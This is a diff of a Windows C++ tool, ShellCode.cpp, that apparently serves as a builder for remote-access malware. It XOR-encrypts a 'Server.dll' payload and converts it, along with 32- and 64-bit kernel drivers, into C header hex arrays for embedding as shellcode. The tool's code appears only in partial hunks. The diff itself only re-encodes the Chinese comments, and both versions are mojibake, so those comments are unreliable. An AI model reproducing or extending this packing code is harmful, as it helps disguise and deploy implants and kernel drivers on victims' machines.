@@ -1,11 +1,11 @@
-ï»¿// ShellCode.cpp : Defines the entry point for the console application.
+// ShellCode.cpp : Defines the entry point for the console application.
 //
 
 #include "stdafx.h"
 #include <stdlib.h>
 #include <Windows.h>
 
-void EncrypMain(char *Buff, int Size, char *AddTable) //åŠ å¯†/è§£å¯†æœåŠ¡ç«¯æ–‡ä»¶(Server.dll)
+void EncrypMain(char *Buff, int Size, char *AddTable) //¼ÓÃÜ/½âÃÜ·şÎñ¶ËÎÄ¼ş(Server.dll)
 {
 	for (int i=0, j=0; i<Size; i++)
 	{
@@ -16,7 +16,7 @@ void EncrypMain(char *Buff, int Size, char *AddTable) //åŠ å¯†/è§£å¯†æœåŠ¡ç«¯æ–
 	}
 }
 
-void EncryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //åŠ å¯†æ’ä»¶
+void EncryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //¼ÓÃÜ²å¼ş
 {
 	unsigned long i;
 	unsigned char p;
@@ -29,7 +29,7 @@ void EncryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //
 	}
 }
 
-void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //è§£å¯†æ’ä»¶
+void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //½âÃÜ²å¼ş
 {
 	unsigned long i;
 	unsigned char p;
@@ -43,7 +43,7 @@ void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //
 	}
 }
 
-BOOL SaveDr32(char *FileName) //ç”ŸæˆDriverCode32(DriverCode32.h)
+BOOL SaveDr32(char *FileName) //Éú³ÉDriverCode32(DriverCode32.h)
 {
 	HANDLE hSysFile;
 	DWORD dwSysSize;
@@ -103,7 +103,7 @@ BOOL SaveDr32(char *FileName) //ç”ŸæˆDriverCode32(DriverCode32.h)
 	VirtualFree(pSysBuff, 0, MEM_RELEASE);
 	
 	char OutData1[] = "/*\r\n DriverCode32 By Anonymity\r\n My QQ ????????\r\n"
-		" ç›´æ¥includeæ­¤å•å…ƒï¼Œä½¿ç”¨ DriverCode32SaveFile(\"xxx.xxx\");å³å¯ç”Ÿæˆæ–‡ä»¶\r\n*/\r\n\r\n";
+		" Ö±½Óinclude´Ëµ¥Ôª£¬Ê¹ÓÃ DriverCode32SaveFile(\"xxx.xxx\");¼´¿ÉÉú³ÉÎÄ¼ş\r\n*/\r\n\r\n";
 	char OutData2[] = "#ifndef _HEX_DRIVERCODE32_\r\n#define _HEX_DRIVERCODE32_\r\n#include <windows.h>\r\n\r\n";
 	char OutData3[64] = {0};
 	sprintf(OutData3, "const g_DriverCode32FileSize = %d;\r\n", dwSysSize);
@@ -169,7 +169,7 @@ BOOL SaveDr32(char *FileName) //ç”ŸæˆDriverCode32(DriverCode32.h)
 	return TRUE;
 }
 
-BOOL SaveDr64(char *FileName) //ç”ŸæˆDriverCode64(DriverCode64.h)
+BOOL SaveDr64(char *FileName) //Éú³ÉDriverCode64(DriverCode64.h)
 {
 	HANDLE hSysFile;
 	DWORD dwSysSize;
@@ -229,7 +229,7 @@ BOOL SaveDr64(char *FileName) //ç”ŸæˆDriverCode64(DriverCode64.h)
 	VirtualFree(pSysBuff, 0, MEM_RELEASE);
 	
 	char OutData1[] = "/*\r\n DriverCode64 By Anonymity\r\n My QQ ????????\r\n"
-		" ç›´æ¥includeæ­¤å•å…ƒï¼Œä½¿ç”¨ DriverCode64SaveFile(\"xxx.xxx\");å³å¯ç”Ÿæˆæ–‡ä»¶\r\n*/\r\n\r\n";
+		" Ö±½Óinclude´Ëµ¥Ôª£¬Ê¹ÓÃ DriverCode64SaveFile(\"xxx.xxx\");¼´¿ÉÉú³ÉÎÄ¼ş\r\n*/\r\n\r\n";
 	char OutData2[] = "#ifndef _HEX_DRIVERCODE64_\r\n#define _HEX_DRIVERCODE64_\r\n#include <windows.h>\r\n\r\n";
 	char OutData3[64] = {0};
 	sprintf(OutData3, "const g_DriverCode64FileSize = %d;\r\n", dwSysSize);
@@ -295,7 +295,7 @@ BOOL SaveDr64(char *FileName) //ç”ŸæˆDriverCode64(DriverCode64.h)
 	return TRUE;
 }
 
-BOOL SaveMain(char *FileName, char *AddTable) //ç”ŸæˆåŠ å¯†åçš„æ–‡ä»¶(Server.dll)
+BOOL SaveMain(char *FileName, char *AddTable) //Éú³É¼ÓÃÜºóµÄÎÄ¼ş(Server.dll)
 {
 	HANDLE hDllFile;
 	DWORD dwDllSize;
@@ -340,7 +340,7 @@ BOOL SaveMain(char *FileName, char *AddTable) //ç”ŸæˆåŠ å¯†åçš„æ–‡ä»¶(Server.
 	return TRUE;
 }
 
-BOOL SaveCode(char *FileName) //ç”ŸæˆShellCode(ShellCode.h)
+BOOL SaveCode(char *FileName) //Éú³ÉShellCode(ShellCode.h)
 {
 	HANDLE hDllFile;
 	DWORD dwDllSize;
@@ -399,8 +399,8 @@ BOOL SaveCode(char *FileName) //ç”ŸæˆShellCode(ShellCode.h)
 	}
 	VirtualFree(pDllBuff, 0, MEM_RELEASE);
 	
-	char OutData1[] = "/*\r\n ShellCodeè½¬æ¢å™¨ By Anonymity\r\n My QQ ????????\r\n"
-		" ç›´æ¥includeæ­¤å•å…ƒï¼Œä½¿ç”¨ ShellCodeSaveFile(\"xxx.xxx\");å³å¯ç”Ÿæˆæ–‡ä»¶\r\n*/\r\n\r\n";
+	char OutData1[] = "/*\r\n ShellCode×ª»»Æ÷ By Anonymity\r\n My QQ ????????\r\n"
+		" Ö±½Óinclude´Ëµ¥Ôª£¬Ê¹ÓÃ ShellCodeSaveFile(\"xxx.xxx\");¼´¿ÉÉú³ÉÎÄ¼ş\r\n*/\r\n\r\n";
 	char OutData2[] = "#ifndef _HEX_SHELLCODE_\r\n#define _HEX_SHELLCODE_\r\n#include <windows.h>\r\n\r\n";
 	char OutData3[64] = {0};
 	sprintf(OutData3, "const g_ShellCodeFileSize = %d;\r\n", dwDllSize);
@@ -525,13 +525,13 @@ int main(int argc, char* argv[])
 		
 		switch (argv[1][1])
 		{
-		case '3': //è¾“å…¥æ–‡ä»¶å(QAssist32.sys), ç”Ÿæˆ"DriverCode32.h"
+		case '3': //ÊäÈëÎÄ¼şÃû(QAssist32.sys), Éú³É"DriverCode32.h"
 			return SaveDr32(argv[2]) ? 0 : -1;
-		case '6': //è¾“å…¥æ–‡ä»¶å(QAssist64.sys), ç”Ÿæˆ"DriverCode64.h"
+		case '6': //ÊäÈëÎÄ¼şÃû(QAssist64.sys), Éú³É"DriverCode64.h"
 			return SaveDr64(argv[2]) ? 0 : -1;
-		case 'E': //è¾“å…¥æœªåŠ å¯†æ–‡ä»¶å(Server.dll), ç”ŸæˆåŠ å¯†åçš„æ–‡ä»¶(Server.dll)
+		case 'E': //ÊäÈëÎ´¼ÓÃÜÎÄ¼şÃû(Server.dll), Éú³É¼ÓÃÜºóµÄÎÄ¼ş(Server.dll)
 			return SaveMain(argv[2], (char *)MyFileTabLe) ? 0 : -1;
-		case 'S': //è¾“å…¥å·²åŠ å¯†æ–‡ä»¶å(Server.dll), ç”Ÿæˆ"ShellCode.h"
+		case 'S': //ÊäÈëÒÑ¼ÓÃÜÎÄ¼şÃû(Server.dll), Éú³É"ShellCode.h"
 			return SaveCode(argv[2]) ? 0 : -1;
 		default:
 			return -1;
